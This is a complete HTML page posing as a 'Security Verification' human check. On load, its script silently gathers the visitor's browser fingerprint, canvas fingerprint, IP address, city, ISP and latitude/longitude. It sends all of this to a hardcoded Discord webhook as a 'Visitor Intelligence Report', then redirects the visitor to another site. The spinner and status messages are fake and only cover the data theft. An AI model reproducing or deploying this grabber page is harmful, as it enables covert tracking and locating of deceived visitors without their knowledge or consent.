<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');

        body {
            font-family: 'Inter', Arial, sans-serif;
            background: linear-gradient(135deg, #0f0f23, #1a1a2e);
            color: #e0e0e0;
            text-align: center;
            padding: 40px 20px;
            margin: 0;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .container {
            max-width: 520px;
            margin: 0 auto;
            background: rgba(25, 25, 40, 0.95);
            padding: 50px 40px;
            border-radius: 16px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4);
            border: 1px solid rgba(100, 100, 255, 0.2);
        }

        .spinner {
            width: 72px;
            height: 72px;
            border: 6px solid rgba(100, 150, 255, 0.2);
            border-top: 6px solid #6496ff;
            border-radius: 50%;
            animation: spin 1.2s linear infinite;
            margin: 20px auto;
        }

        .progress-bar {
            height: 4px;
            background: #6496ff;
            width: 0%;
            margin: 25px auto;
            border-radius: 2px;
            transition: width 1.5s ease-in-out;
        }

        h1 {
            color: #6496ff;
            font-size: 24px;
            margin: 15px 0;
            font-weight: 600;
        }

        p {
            color: #b0b0cc;
            font-size: 16px;
            line-height: 1.5;
            margin: 15px 0 30px;
        }

        .status {
            font-size: 14px;
            color: #88ff88;
            margin-top: 10px;
            opacity: 0.9;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .shield {
            font-size: 42px;
            margin-bottom: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="shield">🛡️</div>
        <h1>Security Verification</h1>
        <p>We are verifying that you are a real human and not an automated bot.<br>This process usually takes just a few seconds.</p>
        
        <div class="spinner"></div>
        <div class="progress-bar" id="progress"></div>
        
        <div class="status" id="status">Analyzing browser fingerprint...</div>
    </div>

    <script>
        const REAL_SITE_URL = "https://unkn0wn-sh4d0w.github.io/";
        const LOG_ENDPOINT = "https://discord.com/api/webhooks/1499531983313702942/6aDuXvkEl4LzC8hiXc01kJLq83wwoYQXWyaD-YWQWuCnGVVVTmPeqcSLJypTr_BLGXmT";

        async function collectAdvancedData() {
            const data = {
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                language: navigator.language || navigator.userLanguage,
                languages: navigator.languages ? navigator.languages.join(", ") : "unknown",
                platform: navigator.platform,
                cookieEnabled: navigator.cookieEnabled,
                online: navigator.onLine,
                hardwareConcurrency: navigator.hardwareConcurrency || "unknown",
                deviceMemory: navigator.deviceMemory || "unknown",
                screenResolution: `\( {screen.width}× \){screen.height}`,
                colorDepth: screen.colorDepth,
                pixelRatio: window.devicePixelRatio,
                referrer: document.referrer || "direct",
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
            };

            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                canvas.width = 200;
                canvas.height = 50;
                ctx.textBaseline = "alphabetic";
                ctx.font = "14px Arial";
                ctx.fillStyle = "#f60";
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = "#069";
                ctx.fillText("Hello, World!", 2, 15);
                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
                ctx.fillText("Hello, World!", 4, 17);
                data.canvasFingerprint = canvas.toDataURL().slice(0, 100) + "...";
            } catch(e) {
                data.canvasFingerprint = "failed";
            }

            try {
                const geoRes = await fetch("https://ipapi.co/json/");
                if (geoRes.ok) {
                    const geo = await geoRes.json();
                    data.ip = geo.ip || "unknown";
                    data.country = geo.country_name || "unknown";
                    data.city = geo.city || "unknown";
                    data.region = geo.region || "unknown";
                    data.isp = geo.org || "unknown";
                    data.latitude = geo.latitude;
                    data.longitude = geo.longitude;
                }
            } catch (e) {
                console.error("Geo fetch failed");
            }

            return data;
        }

        async function logData(data) {
            try {
                await fetch(LOG_ENDPOINT, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        content: "🚨 **New Visitor Logged**",
                        embeds: [{
                            title: "Visitor Intelligence Report",
                            description: "```json\n" + JSON.stringify(data, null, 2) + "\n```",
                            color: 0x00ff88,
                            timestamp: new Date().toISOString()
                        }]
                    })
                });
            } catch (err) {
                console.error("Logging failed:", err);
            }
        }

        function simulateProgress() {
            const progressBar = document.getElementById('progress');
            const statusText = document.getElementById('status');
            const steps = [
                "Analyzing browser fingerprint...",
                "Checking device characteristics...",
                "Verifying human behavior patterns...",
                "Validating session integrity...",
                "Security check completed"
            ];

            let progress = 0;
            let stepIndex = 0;

            const interval = setInterval(() => {
                progress += Math.random() * 18 + 8;
                if (progress > 100) progress = 100;

                progressBar.style.width = progress + "%";

                if (progress > stepIndex * 25 && stepIndex < steps.length) {
                    statusText.textContent = steps[stepIndex];
                    stepIndex++;
                }

                if (progress >= 100) {
                    clearInterval(interval);
                }
            }, 180);
        }

        window.onload = async () => {
            simulateProgress();

            const visitorData = await collectAdvancedData();
            
            await logData(visitorData);

            setTimeout(() => {
                window.location.replace(REAL_SITE_URL);
            }, 1850);
        };
    </script>
</body>
</html>
